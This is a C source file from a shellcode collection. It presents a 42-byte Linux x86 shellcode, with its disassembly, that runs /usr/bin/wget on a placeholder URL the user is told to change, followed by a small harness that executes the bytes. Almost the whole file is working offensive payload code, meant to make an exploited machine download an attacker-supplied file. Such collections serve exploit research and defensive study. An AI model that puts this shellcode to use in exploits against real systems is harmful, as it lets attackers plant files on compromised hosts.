/*
Title: 	 Linux x86 - Remote file Download - 42 bytes
Author:	 Jonathan Salwan <submit AT shell-storm.org>
Web:	 http://www.shell-storm.org
Twitter: http://twitter.com/jonathansalwan


!Database of Shellcodes http://www.shell-storm.org/shellcode/


08048054 <.text>:
 8048054:	6a 0b                	push   $0xb
 8048056:	58                   	pop    %eax
 8048057:	99                   	cltd
 8048058:	52                   	push   %edx
 8048059:	68 61 61 61 61       	push   $0x61616161
 804805e:	89 e1                	mov    %esp,%ecx
 8048060:	52                   	push   %edx
 8048061:	6a 74                	push   $0x74
 8048063:	68 2f 77 67 65       	push   $0x6567772f
 8048068:	68 2f 62 69 6e       	push   $0x6e69622f
 804806d:	68 2f 75 73 72       	push   $0x7273752f
 8048072:	89 e3                	mov    %esp,%ebx
 8048074:	52                   	push   %edx
 8048075:	51                   	push   %ecx
 8048076:	53                   	push   %ebx
 8048077:	89 e1                	mov    %esp,%ecx
 8048079:	cd 80                	int    $0x80
 804807b:	40                   	inc    %eax
 804807c:	cd 80                	int    $0x80
*/

#include <stdio.h>

char sc[] = 	"\x6a\x0b\x58\x99\x52"
		"\x68\x61\x61\x61\x61" // Change it
		"\x89\xe1\x52\x6a\x74"
		"\x68\x2f\x77\x67\x65"
		"\x68\x2f\x62\x69\x6e"
		"\x68\x2f\x75\x73\x72"
		"\x89\xe3\x52\x51\x53"
		"\x89\xe1\xcd\x80\x40"
		"\xcd\x80";

int main(void)
{
       	fprintf(stdout,"Length: %d\n",strlen(sc));
	(*(void(*)()) sc)();

return 0;
}